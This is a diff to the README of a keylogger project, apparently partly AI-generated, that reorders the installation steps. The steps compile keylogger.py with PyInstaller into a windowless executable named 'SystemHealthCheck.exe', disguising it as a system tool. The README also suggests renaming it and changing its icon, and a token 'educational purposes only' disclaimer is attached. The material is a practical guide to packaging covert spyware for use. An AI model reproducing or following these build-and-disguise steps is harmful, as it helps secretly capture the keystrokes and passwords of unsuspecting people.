@@ -4,6 +4,8 @@ This is a good keylogger that is simple and customizable, made by deepseek &amp;
 
 Please note, this keylogger is for educational purposes only. No contributors, major or minor, are to fault for any actions done by this program.
 
+YOU MUST HAVE PYTHON INSTALLED IN ORDER FOR THE INSTALATION TO BE SUCCESFULL
+
 INSTALATION TUTORIAL:
 
 ====== CONFIGURATION ======
@@ -30,21 +32,23 @@ Step 1. Download keylogger.py
 
 Step 2. Put it in a folder
 
-Step 3. Open PowerShell
+Step 3. Copy the directory of the file
 
-Step 4. Copy the directory of the file
+Step 4. Open PowerShell
 
-Step 5. --IN POWERSHELL-- write: cd (keylogger file directory)
+Step 5. --IN POWERSHELL-- write: pip install pyinstaller
 
-Step 6. --IN POWERSHELL-- write: pyinstaller --onefile --noconsole --clean --icon=default.ico --name "SystemHealthCheck.exe" keylogger.py
+Step 6. --IN POWERSHELL-- write: cd (keylogger file directory)
 
-Step 7. IN THE KEYLOGGER FOLDER THERE SHOULD APPEAR A A FEW NEW FOLDERS, OPEN THE ONE NAMED "dist" AND COPY THE .EXE file from it
+Step 7. --IN POWERSHELL-- write: pyinstaller --onefile --noconsole --clean --icon=default.ico --name "SystemHealthCheck.exe" keylogger.py
 
-Step 8. THE COPIED .EXE FILE IS READY TO USE
+Step 8. IN THE KEYLOGGER FOLDER THERE SHOULD APPEAR A FEW NEW FOLDERS, OPEN THE ONE NAMED "dist" AND COPY THE .EXE file from it
 
-Step 9. (OPTIONAL) YOU CAN RENAME THE .EXE FILE TO WHATEVER YOU WANT
+Step 9. THE COPIED .EXE FILE IS READY TO USE
 
-Step 10. (OPTIONAL) IF YOU WANT TO CHANGE THE .EXE ICON YOU CAN FOLLOW THIS TUTORIAL (not mine): https://www.youtube.com/watch?v=1jZt6m_SkDs
+Step 10. (OPTIONAL) YOU CAN RENAME THE .EXE FILE TO WHATEVER YOU WANT
+
+Step 11. (OPTIONAL) IF YOU WANT TO CHANGE THE .EXE ICON YOU CAN FOLLOW THIS TUTORIAL (not mine): https://www.youtube.com/watch?v=1jZt6m_SkDs
 
 ====== THATS ALL ======
 
